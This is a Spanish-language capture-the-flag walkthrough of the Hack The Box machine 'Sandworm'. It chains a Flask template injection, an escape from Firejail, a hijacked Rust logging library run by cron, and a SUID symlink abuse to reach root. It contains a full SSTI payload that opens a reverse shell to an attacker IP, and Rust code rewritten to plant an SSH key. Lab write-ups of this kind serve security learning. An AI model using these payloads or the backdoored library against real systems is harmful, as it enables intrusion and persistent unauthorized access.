----
- Tags: #flask #ssti #firejail #library-impersonation-attack #rust #SUID #symbolic-link #seasson2 
-------
## Técnicas utilizadas
- Server Side Template Injection(Flask)
- Escape from FireJail
- Library Impersonation Attack
- Abuse SUID [symbolic link]
## Procedimiento

![[Pasted image 20230617101735.png]]

#### Reconocimiento

El escaneo con nmap nos da como resultado los siguientes puertos:

![[Pasted image 20230617121012.png]]

Si lanzamos un **whatweb** para ver las tecnologías que corren por detrás de la pagina web, podemos ver lo siguiente:

![[Pasted image 20230617121152.png]]

Nos redirige a https://ssa.htb. Vemos que que es una pagina con protección *HTTPS* y tiene un certificado auto firmado. También podemos observar que por detrás esta corriendo Flask, esto podríamos aprovecharlo si encontramos manera de efectuar un *SSTI* 

Vemos el puerto **433** que pertenece al *HTTPS* si tratamos de conectarnos con *openssl* para ver el certificado podemos ver un correo:

![[Pasted image 20230617121700.png]]

-----------
#### Server Side Template Injection(Flask)

La pagina principal no tiene nada de interesante, en donde nos vamos estar enfocando es en apartado de *guide*. Nos vamos apoyar de https://pgpkeygen.com/ y de http://www.2pih.com/pgp.html. Lo primero que tenemos que hacer es crear un usuario con las siguientes características

	Usuario: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.181/443 0>&1"').read() }}
	Email: test@test.com
	Comentario: NULL
	Encrypt: RSA
	Key Size: 2048 bits
	Expires: Never
	Passphrase: test

Una vez tengamos nuestra clave privado y clave publica con los datos anteriormente mencionados, pasaremos a crear nuestro **PGP Signature**. primero pasaremos nuestra **Passphrase**:

![[Pasted image 20230617180457.png]]

En el cuerpo de mensaje en realidad no importa lo que coloques, puedes poner incluso un simple *Hola*. Le damos al boton de *Sign*. Copiamos el *Signature* y lo pegamos aqui:

![[Pasted image 20230617180742.png]]

Por otro lado, nuestra clave publica la pegaremos del otro lado:

![[Pasted image 20230617180818.png]]

Una vez le demos al boton de **Verify Signature** nos lanzara una consola a nuestro equipo.

#### Escape from FireJail

Dentro del equipo, lo primero que puede llamar la atención es la limitada cantidad de comandos que se pueden ejecutar. Leyendo algunas de las configuraciones dentro de nuestra carpeta de usuario podemos encontrar en */home/atlas/.config/* un directorio con nombre *FireJail*. Es importante esto, ya que si buscamos en google que es nos muestra lo siguiente:

	Firejail es un programa capaz de generar espacios aislados de SUID que reduce el riesgo de infracciones de seguridad al restringir el entorno de ejecución de aplicaciones que no son de confianza utilizando espacios de nombres de Linux, seccomp-bpf y otras capacidades de Linux.

Ahora sabemos porque no podemos ejecutar comandos. Leyendo algunos archivos en nuestra carpeta personal, nos encontramos con uno que contiene credenciales para conectarnos por *SSH* como *SilentObserver*:

![[Pasted image 20230618165031.png]]

-------------------------------
#### Library Impersonation Attack

Como el usuario *SilentObserver* podemos hacer algunas cosas, pero la que más llama la atención es la capacidad para editar una librería de *RUST* de un programa que se ejecuta en intervalos regulares de tiempo. Sabemos que se ejecuta en intervalos de tiempo gracias a *PSPY*
La librería en cuestión se encuentra en */opt/crates/logger/src/lib.rs* y contiene lo siguiente:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Intentado ejecutar comandos vemos que no llegamos a lograrlo, sin embargo, tenemos la capacidad de escribir archivos y almacenarlos donde el usuario *Atlas* pueda. Sabiendo esto, procedemos a introducir nuestra *id_rsa.pub* en *Authorized_keys* del usuario atlas. El contenido de la libreria se veria asi:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnNVEJxrYQTV4vwTFJcnxOjI1XvTtTtqhw9pXaJb8CrSVROcVh73EsYrIxTv1kshteWNSRUwzhr3QsEelsxG9NZjYV10Kyy14ZDnpgl3crVkLLp9UGjIXiSpQApYQ/dCK/5AEA9duZEn1aIYu5kDio6KNM2IlS9NBSNehqC2ewc3PMYZ0r72GZU2HQvbeXUYEdegDIMsdcI+yzPXysUlAo3R6ovllLj/I+OFD6FDnWE8JRaKabHaaoSa7Mv5q/Wst41KTLYPhQMuomsQenXU7iH/XBGUFhUxAuNOx6u0nKr7ZyUKWMmjC0ZLriDPW7m/7I+ppizmLwJ9LTKYQDb3NVKNpE0jWny+yljsEslLq7FjBGeA32GhbEsflZc+auXwaf4rwtl4oI4DoWbAaAMLv5+JYJXhFqvbqhvIklZ95es4FIMTWt7MrRmy90mxTMl5H8u+QHteGrRDlep1W7YX5eMjg2iuqREz7PxsUXwiEDXekyuxV4eZS6C3U36OM7m2c= sexcott@parrot");

    let mut file = match OpenOptions::new().append(true).create(true).open("/home/atlas/.ssh/authorized_keys") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Esperamos a que se ejecute la tarea *Cron* e intentamos posteriormente conectarnos con atlas desde *SSH*.

#### Abuse SUID [symbolic link]

Ahora que somos atlas, tenemos la capicidad de ejecutar comandos que antes no habiamos podido ya que ahora nuestra conexión fue a través de *SSH*.

Buscando por archivos SUID, vemos que existe uno y que nuestro usuario es el que propietario de este:

![[Pasted image 20230618170709.png]]

Pues bien, observando las tareas *cron* con pspy, vemos que el usuario root es el que le otorga el privilegio SUID. Dado que nosotros tenemos capacidad de escritura en el directorio actual, procedemos a crear un enlace simbólico que apunte a la */bin/bash*.  Entonces haremos lo siguiente:

	atlas@sandworm$ ln -s -f /bin/bash /opt/tipnet/target/debug/tipnet 

Ahora si listamos los permisos de */bin/bash* vemos que tiene *SUID*:

![[Pasted image 20230618171718.png]]

Ahora solo hacemos */bin/bash -p* para ejecutar la bash como usuario privilegiado y podemos leer la flag:

![[Pasted image 20230618171852.png]]

